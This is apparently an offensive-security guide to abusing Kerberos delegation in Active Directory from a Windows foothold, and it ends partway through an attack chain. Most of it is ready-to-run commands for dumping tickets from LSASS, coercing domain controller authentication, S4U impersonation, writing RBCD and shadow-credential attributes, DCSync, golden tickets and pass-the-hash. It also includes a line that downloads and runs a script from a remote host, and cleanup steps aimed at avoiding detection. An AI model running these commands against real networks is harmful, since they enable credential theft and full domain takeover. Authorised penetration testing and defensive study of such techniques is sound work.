---
title: "Delegation Attacks — From Windows"
description: "Abusing Kerberos delegation (Unconstrained, Constrained, RBCD, Shadow Credentials) from a Windows foothold using Rubeus, PowerView, and PowerMad."
weight: 4
tags: ["active-directory", "delegation", "windows", "rubeus", "powerview", "rbcd", "kerberos"]
---

# Delegation Attacks — From Windows

Kerberos delegation allows services to impersonate users when accessing downstream resources on their behalf. Misconfigured delegation is one of the most reliable paths to domain compromise from a low-privilege Windows foothold. This guide covers all four major delegation attack classes — Unconstrained, Constrained (KCD), Resource-Based Constrained Delegation (RBCD), and Shadow Credentials — with full PowerShell and command-line tradecraft.

---

## Quick Reference Table

| Attack | Primary Tool | Required Privilege |
|---|---|---|
| Unconstrained Delegation | Rubeus monitor + coercion | Local Admin on delegating host |
| Constrained Delegation | Rubeus s4u | Service account creds or hash |
| RBCD | PowerMad + PowerView + Rubeus | GenericWrite or WriteDACL on target computer object |
| Shadow Credentials | Whisker + Rubeus | WriteProperty on msDS-KeyCredentialLink |

---

## 1. Delegation Concepts

### 1.1 Why Delegation Exists

Kerberos delegation was introduced to solve the "double-hop" problem: when a front-end web service needs to authenticate to a back-end SQL server using the identity of the connecting user, it needs the ability to forward or impersonate that user's credentials downstream. Three delegation mechanisms exist in Active Directory, each with different security boundaries and abuse surfaces.

### 1.2 The Three Delegation Types

**Unconstrained Delegation**
When a computer or service account is configured with Unconstrained Delegation, the KDC embeds a full copy of the authenticating user's TGT inside the service ticket (via the `FORWARDABLE` flag). The service receives and caches this TGT, which it can then use to request service tickets on behalf of that user to any target in the domain. This is the most powerful and dangerous form of delegation.

**Constrained Delegation (KCD — Kerberos Constrained Delegation)**
With Constrained Delegation, the service account is authorized to impersonate users, but only to a specific list of services defined in `msDS-AllowedToDelegateTo`. The KDC enforces these restrictions at ticket issuance time. Two sub-types exist:
- Without Protocol Transition: requires an existing TGS for the user to initiate S4U2Proxy
- With Protocol Transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`): allows the service to call S4U2Self for any user even without a prior TGS, then chain into S4U2Proxy

**Resource-Based Constrained Delegation (RBCD)**
Introduced in Windows Server 2012. Unlike classical KCD where the delegating account defines what it can delegate to, RBCD inverts the model: the target resource defines which accounts are permitted to delegate to it. This is controlled by the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the target computer object. An attacker with write access to this attribute on any computer can configure RBCD to impersonate any domain user against that computer.

### 1.3 UAC Flags for Delegation

The `userAccountControl` LDAP attribute stores delegation settings as bit flags.

| Flag Name | Hex | Decimal | Meaning |
|---|---|---|---|
| `TRUSTED_FOR_DELEGATION` | `0x80000` | 524288 | Unconstrained Delegation enabled |
| `TRUSTED_TO_AUTH_FOR_DELEGATION` | `0x1000000` | 16777216 | Protocol Transition (S4U2Self for any user) |
| `NOT_DELEGATED` | `0x100000` | 1048576 | Account is sensitive and cannot be delegated |
| `WORKSTATION_TRUST_ACCOUNT` | `0x1000` | 4096 | Standard computer account |

### 1.4 Key LDAP Attributes

| Attribute | Delegation Type | Purpose |
|---|---|---|
| `userAccountControl` | All | Contains delegation flag bits |
| `msDS-AllowedToDelegateTo` | Constrained | Lists SPNs this account can delegate to |
| `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD | Binary security descriptor — who can delegate to this object |
| `msDS-KeyCredentialLink` | Shadow Credentials | Stores raw public key credentials for PKINIT |
| `servicePrincipalName` | All | SPNs registered to an account |

---

## 2. Finding Delegation with PowerView

Assuming PowerView is already loaded (`Import-Module .\PowerView.ps1` or `IEX (New-Object Net.WebClient).DownloadString('http://TARGET_IP/PowerView.ps1')`).

### 2.1 Enumerate Unconstrained Delegation

```powershell
# Computers configured for Unconstrained Delegation
# (DCs are always set — skip them unless you want to target DCs directly)
Get-DomainComputer -Unconstrained | Select-Object name, dnshostname, useraccountcontrol

# Filter out Domain Controllers to find interesting targets
Get-DomainComputer -Unconstrained | Where-Object {
    $_.useraccountcontrol -band 524288 -and
    $_.name -notmatch 'DC'
} | Select-Object name, dnshostname, operatingsystem

# Users configured for Unconstrained Delegation (rare but exists on legacy setups)
Get-DomainUser | Where-Object {$_.useraccountcontrol -band 524288} |
    Select-Object samaccountname, useraccountcontrol, msds-allowedtodelegateto
```

### 2.2 Enumerate Constrained Delegation

```powershell
# Users with Constrained Delegation configured
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto, useraccountcontrol

# Computers with Constrained Delegation configured
Get-DomainComputer -TrustedToAuth | Select-Object name, dnshostname, msds-allowedtodelegateto

# Users with Protocol Transition (TRUSTED_TO_AUTH_FOR_DELEGATION bit set)
Get-DomainUser -TrustedToAuth | Where-Object {
    $_.useraccountcontrol -band 0x1000000
} | Select-Object samaccountname, msds-allowedtodelegateto

# Expand the SPN list for Constrained Delegation accounts
Get-DomainUser -TrustedToAuth | ForEach-Object {
    $user = $_.samaccountname
    $_.msds-allowedtodelegateto | ForEach-Object {
        [PSCustomObject]@{User = $user; DelegatesTo = $_}
    }
}
```

### 2.3 Enumerate RBCD Configurations

```powershell
# Computers where RBCD is already configured (msDS-AllowedToActOnBehalfOfOtherIdentity is set)
Get-DomainComputer | Where-Object {
    $_.'msds-allowedtoactonbehalfofotheridentity' -ne $null
} | Select-Object name, dnshostname

# Identify ACL-based RBCD opportunities — accounts where you have write access
# This finds GenericWrite / WriteDACL / WriteProperty on computer objects
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|WriteDACL|WriteProperty" -and
    $_.ObjectAceType -match "ms-DS-Allowed-To-Act|00000000-0000-0000-0000-000000000000"
} | Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier, AceType

# Who has GenericWrite over any computer object
Get-DomainObjectAcl -LDAPFilter '(objectCategory=computer)' -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite" -and
    $_.AceType -eq "AccessAllowed"
} | Select-Object ObjectDN, SecurityIdentifier
```

### 2.4 Enumerate Shadow Credential Opportunities

```powershell
# Accounts with GenericWrite (covers WriteProperty on msDS-KeyCredentialLink)
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|WriteProperty" -and
    $_.ObjectAceType -match "msDS-KeyCredentialLink|00000000-0000-0000-0000-000000000000"
} | Select-Object ObjectDN, SecurityIdentifier, ActiveDirectoryRights

# Check existing msDS-KeyCredentialLink entries on a target
Get-DomainObject -Identity USERNAME -Properties msds-keycredentiallink
Get-DomainComputer -Identity COMPUTER_NAME -Properties msds-keycredentiallink
```

---

## 3. Finding Delegation with Rubeus

Rubeus has a built-in `find` command that performs an LDAP query for all delegation-configured accounts.

```
# Enumerate all delegation types — users and computers
Rubeus.exe find /showsupported

# Enumerate only Unconstrained Delegation accounts (UAC flag 524288)
Rubeus.exe find /showsupported /ldapfilter:"(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# Enumerate only Constrained Delegation accounts (UAC flag 16777216)
Rubeus.exe find /showsupported /ldapfilter:"(userAccountControl:1.2.840.113556.1.4.803:=16777216)"

# Enumerate accounts with msDS-AllowedToDelegateTo set (Constrained Delegation)
Rubeus.exe find /showsupported /ldapfilter:"(msDS-AllowedToDelegateTo=*)"

# Enumerate against a specific domain controller
Rubeus.exe find /showsupported /domain:TARGET_DOMAIN /dc:DC_HOSTNAME
```

The output will list:
- Account name and type (user vs computer)
- Delegation type (Unconstrained / Constrained / Protocol Transition)
- Supported encryption types
- `msDS-AllowedToDelegateTo` entries where applicable

---

## 4. Unconstrained Delegation Abuse

> **Required privileges:** Local Administrator on a host configured with `TRUSTED_FOR_DELEGATION` (`userAccountControl` bit `0x80000`).

### 4.1 What Unconstrained Delegation Means

When a computer account has `TRUSTED_FOR_DELEGATION` set, the KDC includes a copy of the authenticating user's TGT inside the service ticket it issues (`KRB-CRED` embedded in the TGT's `KERB-AUTH-DATA`). When that user authenticates to the delegated service (e.g., HTTP, CIFS), the service receives and caches the user's full TGT in LSASS. As a local administrator on that host, you can extract all cached TGTs from LSASS memory and use them to impersonate those users to any service in the domain.

The most impactful scenario: coerce a Domain Controller computer account (`DC_HOSTNAME$`) to authenticate to the compromised host, capture the DC's TGT, and use it for DCSync or other domain-level operations.

### 4.2 Dump Cached TGTs from LSASS

```
# Rubeus — dump all krbtgt service tickets from memory (base64 encoded)
Rubeus.exe dump /service:krbtgt /nowrap

# Rubeus — dump all tickets including all services
Rubeus.exe dump /nowrap

# Mimikatz — export all cached tickets to .kirbi files
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

# Mimikatz — view tickets in memory without export
mimikatz # sekurlsa::tickets
```

After running `sekurlsa::tickets /export`, `.kirbi` files appear in the current directory. Look for tickets belonging to privileged accounts or DC computer accounts.

### 4.3 Active Coercion — Monitor and Trigger

This technique forces the DC to authenticate to your compromised host, delivering its TGT into LSASS.

**Terminal 1 — Start Rubeus monitor (wait for incoming TGTs):**
```
Rubeus.exe monitor /interval:5 /filteruser:DC_HOSTNAME$ /nowrap

# Without filter — catch all incoming TGTs
Rubeus.exe monitor /interval:5 /nowrap

# With targetuser filter (multiple accounts)
Rubeus.exe monitor /interval:5 /filteruser:DC_HOSTNAME$ /targetou:"OU=Domain Controllers,DC=TARGET_DOMAIN,DC=com" /nowrap
```

**Terminal 2 — Trigger coercion from the compromised host:**

MS-RPRN PrinterBug (SpoolSample) — abuses the Windows Print Spooler `RpcRemoteFindFirstPrinterChangeNotification` function:
```
# SpoolSample — trigger DC to authenticate to compromised host
SpoolSample.exe DC_HOSTNAME COMPUTER_NAME

# From PowerShell
[System.Reflection.Assembly]::LoadWithPartialName('System.Runtime.InteropServices') | Out-Null
# ... or invoke SpoolSample via rundll32/reflective loading
```

MS-EFSR PetitPotam — abuses the Encrypting File System Remote Protocol:
```
# PetitPotam Windows version — trigger from compromised host
PetitPotam.exe COMPUTER_NAME DC_HOSTNAME

# Invoke-PetitPotam PowerShell wrapper
Import-Module .\Invoke-Petitpotam.ps1
Invoke-PetitPotam -Target DC_HOSTNAME -Listener COMPUTER_NAME
```

MS-DFSNM DFSCoerce:
```
DFSCoerce.exe DC_HOSTNAME COMPUTER_NAME
```

Once the DC authenticates to the compromised host, Rubeus monitor will print the captured TGT in base64. Copy the base64 blob.

### 4.4 Inject the Captured TGT and Access the DC

```
# Inject the DC TGT into the current session
Rubeus.exe ptt /ticket:BASE64_TICKET

# Verify the ticket is loaded
klist

# Access DC file system (confirms TGT is working)
dir \\DC_HOSTNAME\C$

# Access SYSVOL
dir \\DC_HOSTNAME\SYSVOL

# Run commands on the DC
Enter-PSSession -ComputerName DC_HOSTNAME

# Or via PsExec-style
PsExec.exe \\DC_HOSTNAME cmd.exe
```

### 4.5 DCSync After Capturing DC TGT

With the DC TGT injected, you can run DCSync to dump all domain credentials:

```powershell
# Using Mimikatz with the injected DC TGT
mimikatz # lsadump::dcsync /user:krbtgt /domain:TARGET_DOMAIN
mimikatz # lsadump::dcsync /user:Administrator /domain:TARGET_DOMAIN
mimikatz # lsadump::dcsync /all /domain:TARGET_DOMAIN /csv
```

```
# Using Invoke-DCSync (PowerShell)
Invoke-DCSync -DomainController DC_HOSTNAME -DumpForest
```

---

## 5. Constrained Delegation (KCD) Abuse

> **Required privileges:** Credentials (password or hash) for a service account that has `msDS-AllowedToDelegateTo` set.

### 5.1 Constrained Delegation Mechanics

Constrained Delegation uses two Kerberos extensions:
- **S4U2Self** (Service-for-User-to-Self): the service requests a TGS on behalf of a user to itself. Requires `TRUSTED_TO_AUTH_FOR_DELEGATION` for any user, or a pre-existing TGS if that flag is absent.
- **S4U2Proxy** (Service-for-User-to-Proxy): the service uses the S4U2Self TGS to request a TGS to a downstream service (constrained by `msDS-AllowedToDelegateTo`).

Rubeus chains these automatically via the `s4u` command.

### 5.2 Basic S4U Chain with RC4 (NTLM Hash)

```
# Impersonate Administrator to CIFS on TARGET_HOSTNAME using service account's NTLM hash
Rubeus.exe s4u /user:USERNAME /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:"cifs/TARGET_IP.TARGET_DOMAIN" /ptt

# Specify DC explicitly
Rubeus.exe s4u /user:USERNAME /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:"cifs/TARGET_IP.TARGET_DOMAIN" /dc:DC_HOSTNAME /ptt /nowrap

# Impersonate a specific domain user
Rubeus.exe s4u /user:USERNAME /rc4:NTLM_HASH /impersonateuser:DA_USER /msdsspn:"cifs/TARGET_IP.TARGET_DOMAIN" /domain:TARGET_DOMAIN /ptt
```

### 5.3 S4U Chain with AES256 Hash (Stealthier — OPSEC preferred)

```
# AES256 generates fewer downgrade events in audit logs
Rubeus.exe s4u /user:USERNAME /aes256:AES256_HASH /impersonateuser:Administrator /msdsspn:"cifs/TARGET_IP.TARGET_DOMAIN" /ptt /opsec

# AES256 with ldap SPN (for DCSync)
Rubeus.exe s4u /user:USERNAME /aes256:AES256_HASH /impersonateuser:Administrator /msdsspn:"ldap/DC_HOSTNAME.TARGET_DOMAIN" /ptt /opsec
```

### 5.4 Using a Password Instead of Hash

```
# Rubeus will compute the hash internally from the password
Rubeus.exe s4u /user:USERNAME /password:PASSWORD /impersonateuser:Administrator /msdsspn:"cifs/TARGET_IP.TARGET_DOMAIN" /domain:TARGET_DOMAIN /ptt

# With domain specification
Rubeus.exe s4u /user:USERNAME /password:PASSWORD /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /impersonateuser:Administrator /msdsspn:"host/TARGET_IP.TARGET_DOMAIN" /ptt
```

### 5.5 Protocol Transition — S4U2Self for Any User

When the service account has `TRUSTED_TO_AUTH_FOR_DELEGATION` set (UAC bit `0x1000000`), it can call S4U2Self for any user without requiring a pre-existing service ticket from that user. This means you do not need the target user to have authenticated to the service first.

```powershell
# Identify accounts with Protocol Transition enabled
Get-DomainUser -TrustedToAuth | Where-Object {$_.useraccountcontrol -band 0x1000000} |
    Select-Object samaccountname, msds-allowedtodelegateto, useraccountcontrol

Get-DomainComputer -TrustedToAuth | Where-Object {$_.useraccountcontrol -band 0x1000000} |
    Select-Object name, msds-allowedtodelegateto
```

```
# Protocol Transition — request TGS for any user including those not currently logged in
Rubeus.exe s4u /user:USERNAME /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:"cifs/TARGET_IP.TARGET_DOMAIN" /ptt

# No /tgs parameter needed — Rubeus automatically calls S4U2Self first
```

### 5.6 Service Name Substitution (altservice)

The KDC issues tickets with an SPN, but the actual service name portion is not protected by the ticket's MAC. You can substitute the service class while keeping the same host, bypassing the restriction that you can only delegate to specific SPNs. This lets you obtain a CIFS ticket even if the configured SPN is only for HTTP, for example.

```
# The service account is configured to delegate to ldap/DC_HOSTNAME.TARGET_DOMAIN
# but we want CIFS access — substitute the service name
Rubeus.exe s4u /user:USERNAME /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:"ldap/DC_HOSTNAME.TARGET_DOMAIN" /altservice:cifs /ptt

# Request multiple service tickets at once
Rubeus.exe s4u /user:USERNAME /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:"host/TARGET_IP.TARGET_DOMAIN" /altservice:cifs,ldap,http,rpcss /ptt

# AES256 variant with multiple altservice
Rubeus.exe s4u /user:USERNAME /aes256:AES256_HASH /impersonateuser:Administrator /msdsspn:"host/TARGET_IP.TARGET_DOMAIN" /altservice:cifs,ldap /ptt /opsec
```

### 5.7 Service-to-Access Mapping

| SPN / Service Class | Access Gained |
|---|---|
| `cifs` | SMB file shares, PsExec, remote file access |
| `host` | Scheduled tasks, WMI, PSExec, service control |
| `http` | WinRM (PowerShell Remoting), IIS |
| `ldap` | LDAP queries, DCSync via lsadump::dcsync |
| `MSSQLSvc` | SQL Server access |
| `rpcss` | WMI queries via DCOM |
| `wsman` | WinRM, Enter-PSSession |
| `gc` | Global Catalog queries |

### 5.8 After Ticket Injection — Lateral Movement

```powershell
# Verify tickets are loaded
klist

# SMB file access (cifs ticket)
dir \\TARGET_IP\C$
dir \\TARGET_IP\ADMIN$

# PowerShell Remoting (http/wsman ticket)
Enter-PSSession -ComputerName TARGET_IP

# WMI execution (host/rpcss ticket)
Invoke-WmiMethod -ComputerName TARGET_IP -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\Temp\out.txt"

# PsExec with injected ticket
PsExec.exe \\TARGET_IP cmd.exe

# DCSync using injected ldap ticket to DC
mimikatz # lsadump::dcsync /domain:TARGET_DOMAIN /user:krbtgt
```

---

## 6. RBCD (Resource-Based Constrained Delegation)

> **Required privileges:** GenericWrite, WriteDACL, or WriteProperty on the target computer object's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. Additionally, the ability to create a computer account (default quota: 10 per domain user, controlled by `msDS-MachineAccountQuota`).

### 6.1 RBCD Mechanics

RBCD differs from classical KCD in two important ways:
1. The delegation permission is stored on the *resource* (target machine), not the delegating account.
2. Any account with write access to the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute can configure it — no domain admin required.

Attack flow:
1. Verify write access to target computer object
2. Create an attacker-controlled computer account (or use any account you control with an SPN)
3. Write the new computer's SID into target's `msDS-AllowedToActOnBehalfOfOtherIdentity`
4. Run Rubeus `s4u` using the attacker-controlled computer account to impersonate any domain user on the target
5. Inject the ticket and access the target

### 6.2 Step 1 — Verify Write Permissions on Target

```powershell
# Check your current user's SID
$CurrentUserSid = (Get-DomainUser -Identity USERNAME).objectsid
echo $CurrentUserSid

# Check ACLs on target computer object
Get-DomainObjectAcl -Identity COMPUTER_NAME -ResolveGUIDs | Where-Object {
    $_.SecurityIdentifier -eq $CurrentUserSid
} | Select-Object ActiveDirectoryRights, AceType, ObjectAceType

# Alternative — check all interesting ACEs on the target
Get-DomainObjectAcl -Identity COMPUTER_NAME -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|WriteDACL|WriteProperty|GenericAll"
} | Select-Object SecurityIdentifier, ActiveDirectoryRights, AceType, ObjectAceType
```

### 6.3 Step 2 — Create an Attacker-Controlled Machine Account

```powershell
# PowerMad — create a new computer account
Import-Module .\Powermad.ps1

New-MachineAccount -MachineAccount ATTACKER_COMP -Password $(ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force) -Verbose

# Verify creation
Get-DomainComputer -Identity 'ATTACKER_COMP' | Select-Object name, objectsid, dnshostname

# Check msDS-MachineAccountQuota — how many computers can this user add
Get-DomainObject -Identity "DC=TARGET_DOMAIN,DC=com" -Properties 'ms-DS-MachineAccountQuota'
```

> **Note:** `msDS-MachineAccountQuota` defaults to 10, meaning regular domain users can add up to 10 computer accounts without elevated privileges. If it is set to 0, you will need an existing account with an SPN instead.

### 6.4 Step 3 — Retrieve the SID of the Attacker Computer

```powershell
$ComputerSid = Get-DomainComputer 'ATTACKER_COMP' -Properties objectsid | Select-Object -ExpandProperty objectsid
echo $ComputerSid
# Expected output: S-1-5-21-...
```

### 6.5 Step 4 — Build the Security Descriptor

The `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute accepts a binary security descriptor. The DACL entry grants the attacker computer account the right to delegate.

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
echo "Security descriptor built — $($SD.BinaryLength) bytes"
```

The SDDL string `O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)` grants full control to the attacker computer's SID. This is the minimum required to authorize RBCD.

### 6.6 Step 5 — Write the Security Descriptor to Target

```powershell
# Write msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer
Get-DomainComputer COMPUTER_NAME | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SDBytes} -Verbose

# Verify it was written
Get-DomainComputer COMPUTER_NAME -Properties 'msds-allowedtoactonbehalfofotheridentity' |
    Select-Object -ExpandProperty 'msds-allowedtoactonbehalfofotheridentity'

# Decode and verify the written descriptor
$RawBytes = (Get-DomainComputer COMPUTER_NAME -Properties 'msds-allowedtoactonbehalfofotheridentity').'msds-allowedtoactonbehalfofotheridentity'
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl | ForEach-Object {$_}
```

### 6.7 Step 6 — Compute NTLM Hash of Attacker Computer Account

```
# Rubeus hash — compute the NTLM hash from the computer account password
Rubeus.exe hash /password:PASSWORD /user:ATTACKER_COMP$ /domain:TARGET_DOMAIN

# Output will include:
#   rc4_hmac        : <NTLM_HASH>
#   aes128_cts_hmac : <AES128>
#   aes256_cts_hmac : <AES256>
```

Save the `rc4_hmac` value as NTLM_HASH and the `aes256_cts_hmac` as AES256_HASH.

### 6.8 Step 7 — Execute S4U Chain with Rubeus

```
# S4U2Self + S4U2Proxy using RC4
Rubeus.exe s4u /user:ATTACKER_COMP$ /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:"cifs/COMPUTER_NAME.TARGET_DOMAIN" /ptt

# S4U2Self + S4U2Proxy using AES256 (OPSEC preferred)
Rubeus.exe s4u /user:ATTACKER_COMP$ /aes256:AES256_HASH /impersonateuser:Administrator /msdsspn:"cifs/COMPUTER_NAME.TARGET_DOMAIN" /ptt /opsec

# Specify DC explicitly
Rubeus.exe s4u /user:ATTACKER_COMP$ /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:"cifs/COMPUTER_NAME.TARGET_DOMAIN" /dc:DC_HOSTNAME /ptt

# Multiple services at once
Rubeus.exe s4u /user:ATTACKER_COMP$ /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:"host/COMPUTER_NAME.TARGET_DOMAIN" /altservice:cifs,ldap,http /ptt
```

### 6.9 Step 8 — Access the Target

```
# Verify tickets are loaded
klist

# List target file system
dir \\COMPUTER_NAME.TARGET_DOMAIN\C$
dir \\COMPUTER_NAME.TARGET_DOMAIN\ADMIN$

# PowerShell Remoting to target (with http/wsman ticket)
Enter-PSSession -ComputerName COMPUTER_NAME.TARGET_DOMAIN

# Execute commands via WMI
Invoke-WmiMethod -ComputerName COMPUTER_NAME.TARGET_DOMAIN -Class Win32_Process -Name Create -ArgumentList "powershell.exe -NoP -Enc BASE64_PAYLOAD"

# PsExec
PsExec.exe \\COMPUTER_NAME.TARGET_DOMAIN -s cmd.exe
```

### 6.10 Step 9 — Cleanup

After achieving your objective, restore the original state to avoid detection.

```powershell
# Remove the msDS-AllowedToActOnBehalfOfOtherIdentity attribute
Set-DomainObject -Identity COMPUTER_NAME -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose

# Verify removal
Get-DomainComputer COMPUTER_NAME -Properties 'msds-allowedtoactonbehalfofotheridentity'

# Remove the attacker computer account
# Option 1 — using PowerView
Get-DomainComputer ATTACKER_COMP | Remove-DomainObject -Verbose

# Option 2 — using PowerMad
Remove-MachineAccount -MachineAccount ATTACKER_COMP -Verbose

# Option 3 — using AD module
Remove-ADComputer -Identity "ATTACKER_COMP" -Confirm:$false
```

### 6.11 Alternative — RBCD via NTLM Relay

For reference: if you have the ability to trigger NTLM authentication from the target computer (e.g., via PrinterBug or PetitPotam) and cannot relay to LDAP signing enforced hosts, `ntlmrelayx.py` with `--delegate-access` automates the RBCD setup on the Kali side:

```
# From Kali — relay incoming NTLM auth to LDAP and configure RBCD automatically
ntlmrelayx.py -t ldap://DC_IP --delegate-access --no-smb-server -wh ATTACKER_WPAD

# After relay completes, ntlmrelayx prints the attacker computer account credentials
# Use those with Rubeus s4u from Windows as shown above
```

---

## 7. Shadow Credentials

> **Required privileges:** WriteProperty on `msDS-KeyCredentialLink` attribute of the target account (typically covered by GenericWrite).

### 7.1 Shadow Credentials Mechanics

Shadow Credentials abuse the `msDS-KeyCredentialLink` attribute, which was introduced for Windows Hello for Business (WHfB) and PKINIT-based passwordless authentication. When an account has a public key bound to it via this attribute, a user possessing the corresponding private key can authenticate as that account using PKINIT (Kerberos public-key cryptography) without knowing the account's password.

The attack:
1. Generate a key pair
2. Write the public key into target's `msDS-KeyCredentialLink`
3. Authenticate as the target using the private key via PKINIT
4. Extract the NTLM hash via the U2U (User-to-User) Kerberos technique

Tools: **Whisker** (manages the key credential) + **Rubeus** (authenticates with the certificate).

> **Requirement:** The domain must have AD CS or a KDC that supports PKINIT. This is standard in most enterprise environments with Windows Server 2016+ DCs.

### 7.2 Add a Shadow Credential with Whisker

```
# Add a new key credential to TARGET_USER — generates cert.pfx at the specified path
Whisker.exe add /target:USERNAME /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /path:C:\Temp\cert.pfx /password:PASSWORD

# Output will include a ready-to-run Rubeus command
# Example output:
#   [*] No entries for target user/computer found!
#   [*] New values written successfully!
#   [*] Rubeus:
#   Rubeus.exe asktgt /user:USERNAME /certificate:C:\Temp\cert.pfx ...

# Add shadow credential to a computer account
Whisker.exe add /target:COMPUTER_NAME$ /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /path:C:\Temp\comp_cert.pfx /password:PASSWORD
```

### 7.3 Request TGT Using the Certificate

```
# Request TGT using PFX certificate — inject into current session
Rubeus.exe asktgt /user:USERNAME /certificate:C:\Temp\cert.pfx /password:PASSWORD /domain:TARGET_DOMAIN /dc:DC_IP /ptt

# With /nowrap for cleaner base64 output
Rubeus.exe asktgt /user:USERNAME /certificate:C:\Temp\cert.pfx /password:PASSWORD /domain:TARGET_DOMAIN /dc:DC_IP /nowrap

# For computer accounts
Rubeus.exe asktgt /user:COMPUTER_NAME$ /certificate:C:\Temp\comp_cert.pfx /password:PASSWORD /domain:TARGET_DOMAIN /dc:DC_IP /ptt

# Verify the ticket
klist
```

### 7.4 Retrieve the NTLM Hash (U2U Technique)

The NTLM hash is useful for Pass-the-Hash or for further offline cracking. The U2U (User-to-User) Kerberos mechanism allows you to recover it from the PAC embedded in the ticket.

```
# /getcredentials flag triggers U2U and extracts the NTLM hash from the PAC
Rubeus.exe asktgt /user:USERNAME /certificate:C:\Temp\cert.pfx /password:PASSWORD /domain:TARGET_DOMAIN /dc:DC_IP /getcredentials /show

# Output will include:
#   [*] Getting credentials using U2U
#   CredentialInfo :
#     Version : 0
#     EncryptionType : rc4_hmac
#     CredentialData :
#       CredentialCount : 1
#        NTLM           : <NTLM_HASH>
```

With the NTLM hash you can:
```
# Pass-the-Hash with Mimikatz
mimikatz # sekurlsa::pth /user:USERNAME /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /run:cmd.exe

# Pass-the-Hash with Invoke-TheHash
Invoke-WMIExec -Target TARGET_IP -Domain TARGET_DOMAIN -Username USERNAME -Hash NTLM_HASH -Command "whoami" -Verbose
```

### 7.5 Manage Existing Shadow Credentials

```
# List all current key credentials on target
Whisker.exe list /target:USERNAME /domain:TARGET_DOMAIN /dc:DC_HOSTNAME

# Remove a specific key credential by DeviceID GUID
Whisker.exe remove /target:USERNAME /domain:TARGET_DOMAIN /dc:DC_HOSTNAME /deviceid:DEVICE_GUID

# Clear ALL key credentials on target (destructive — removes legitimate WHfB keys too)
Whisker.exe clear /target:USERNAME /domain:TARGET_DOMAIN /dc:DC_HOSTNAME

# List shadow credentials on a computer account
Whisker.exe list /target:COMPUTER_NAME$ /domain:TARGET_DOMAIN /dc:DC_HOSTNAME
```

> **Note:** Before clearing, always run `list` first and record existing DeviceIDs. Removing legitimate Windows Hello for Business keys will break passwordless authentication for the user. If present, prefer `remove` with the specific DeviceID of the key you added, not `clear`.

### 7.6 PowerShell — Read msDS-KeyCredentialLink Directly

```powershell
# Read the raw attribute value
$KeyCredData = Get-DomainObject -Identity USERNAME -Properties 'msds-keycredentiallink'
$KeyCredData.'msds-keycredentiallink'

# Parse key credential entries (each is a binary blob prefixed with version + identifier)
# Each entry begins with a 2-byte version (0x0200) followed by the DN binding data
(Get-ADUser -Identity USERNAME -Properties 'msDS-KeyCredentialLink').'msDS-KeyCredentialLink'
```

---

## 8. Chaining Delegation Attacks

Real-world engagements rarely use a single technique in isolation. The following are common attack chains that combine delegation abuse with other primitives.

### 8.1 Chain 1 — Unconstrained Delegation to Full Domain Compromise

**Scenario:** Compromised a host with `TRUSTED_FOR_DELEGATION`. Goal: domain admin.

```
Step 1 — Confirm the host has Unconstrained Delegation
        Get-DomainComputer -Identity COMPUTER_NAME -Properties useraccountcontrol |
            Select-Object useraccountcontrol
        # useraccountcontrol includes 524288

Step 2 — Start Rubeus monitor for DC$ TGT
        Rubeus.exe monitor /interval:5 /filteruser:DC_HOSTNAME$ /nowrap

Step 3 — Coerce DC authentication via PrinterBug or PetitPotam
        SpoolSample.exe DC_HOSTNAME COMPUTER_NAME

Step 4 — Capture TGT from Rubeus monitor output
        # Copy base64 from monitor output

Step 5 — Inject DC TGT
        Rubeus.exe ptt /ticket:BASE64_TICKET

Step 6 — DCSync all domain credentials
        mimikatz # lsadump::dcsync /domain:TARGET_DOMAIN /all /csv

Step 7 — Golden Ticket persistence with krbtgt hash
        mimikatz # kerberos::golden /user:Administrator /domain:TARGET_DOMAIN
                  /sid:DOMAIN_SID /krbtgt:NTLM_HASH /ptt
```

### 8.2 Chain 2 — GenericWrite to RBCD to Local Admin

**Scenario:** Current user has `GenericWrite` on a computer object. Goal: local admin on that computer.

```powershell
# Step 1 — Confirm GenericWrite
Get-DomainObjectAcl -Identity COMPUTER_NAME -ResolveGUIDs | Where-Object {
    $_.SecurityIdentifier -eq (Get-DomainUser USERNAME).objectsid -and
    $_.ActiveDirectoryRights -match "GenericWrite"
}

# Step 2 — Create attacker computer account
Import-Module .\Powermad.ps1
